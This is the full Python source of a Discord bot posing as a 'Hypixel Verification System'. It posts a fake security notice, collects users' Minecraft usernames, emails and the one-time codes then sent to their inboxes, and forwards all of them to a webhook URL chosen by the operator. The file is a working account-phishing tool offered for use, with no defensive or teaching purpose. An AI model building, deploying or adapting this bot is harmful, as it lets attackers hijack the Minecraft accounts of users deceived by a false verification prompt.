import discord
from discord.ext import commands
from discord import app_commands
import requests
import os

# Define intents
intents = discord.Intents.default()
intents.message_content = True

# Create the bot
bot = commands.Bot(command_prefix='/', intents=intents)

# Store the webhook URL globally
webhook_url = None

# Sync slash commands when the bot is ready
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(r"""
███████╗██╗███████╗██╗███╗   ██╗██████╗ ███████╗
██╔════╝██║██╔════╝██║████╗  ██║██╔══██╗██╔════╝
████╗  ██║█████╗  ██║██╔██╗ ██║██████╔╝█████╗  
██╔══╝  ██║██╔══╝  ██║██║╚██╗██║██╔══██╗██╔══╝  
███████╗██║███████╗██║██║ ╚████║██████╔╝███████╗
╚══════╝╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
""")
    print(f'Logged in as {bot.user}')

# Slash command to set the webhook
@bot.tree.command(name="webhook", description="Set the webhook URL for the verification system.")
@app_commands.describe(url="The webhook URL where verification data will be sent.")
async def set_webhook(interaction: discord.Interaction, url: str):
    global webhook_url
    webhook_url = url
    await interaction.response.send_message("✅ Webhook URL has been set successfully!", ephemeral=True)

# Button View for Verification
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerificationModal())

# Modal to ask for Minecraft Username and Email
class VerificationModal(discord.ui.Modal, title="Minecraft Account Verification"):
    username = discord.ui.TextInput(label="Minecraft Username", placeholder="Enter your username", required=True)
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="Enter your email", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        global webhook_url
        if webhook_url:
            embed = discord.Embed(
                title="Account Log",
                description=f"**Username:** {self.username.value}\n**Email:** {self.email.value}",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Minecraft Verification System")
            data = { "embeds": [embed.to_dict()] }
            requests.post(webhook_url, json=data)

        await interaction.response.send_message(
            embed=discord.Embed(
                title="✅ Account verification in progress!",
                description="You will receive an email with a verification code shortly.\n\nPlease enter the code below to complete the process.",
                color=discord.Color.green()
            ),
            view=CodeView(),
            ephemeral=True
        )

# Button View for entering the verification code
class CodeView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Enter Code", style=discord.ButtonStyle.blurple, custom_id="code_button")
    async def enter_code(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CodeModal())

# Modal to input the verification code
class CodeModal(discord.ui.Modal, title="Enter Verification Code"):
    code = discord.ui.TextInput(label="Verification Code", placeholder="Enter the code you received", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        global webhook_url
        if webhook_url:
            embed = discord.Embed(
                title="Account Log",
                description=f"**Verification Code Entered:** {self.code.value}",
                color=discord.Color.green()
            )
            embed.set_footer(text="Minecraft Verification System")
            data = { "embeds": [embed.to_dict()] }
            requests.post(webhook_url, json=data)

        await interaction.response.send_message(
            embed=discord.Embed(
                title="⏳ Verification in Progress...",
                description="Please wait while the system processes your verification.",
                color=discord.Color.orange()
            ),
            ephemeral=True
        )

# Command to send the verification message
@bot.tree.command(name="send_verify", description="Send the verification message to the current channel.")
async def send_verify(interaction: discord.Interaction):
    await interaction.response.send_message("Verification message is being sent...", ephemeral=True)
    embed = discord.Embed(
        title="⚠️ Verification Required!",
        description=(
            "To ensure the security of our server, please complete the verification process.\n\n"
            "✅ **How to Verify:**\n"
            "Click the **Verify** button below to initiate the verification process.\n\n"
            "Once verified, you will automatically be granted the Member role and full access to the server.\n\n"
            "⚠️ **Until Verification is Complete:**\n"
            "You won’t be able to send messages, access channels, or participate in activities.\n\n"
            "🔒 **This verification process helps keep our community safe. Thank you for your cooperation!**"
        ),
        color=discord.Color.green()
    )
    embed.set_footer(text="Hypixel Verification System")
    await interaction.channel.send(embed=embed, view=VerifyView())

# Run the bot using the environment variable
token = os.getenv("DISCORD_BOT_TOKEN")
if not token:
    raise ValueError("❌ DISCORD_BOT_TOKEN environment variable is not set.")
bot.run(token)
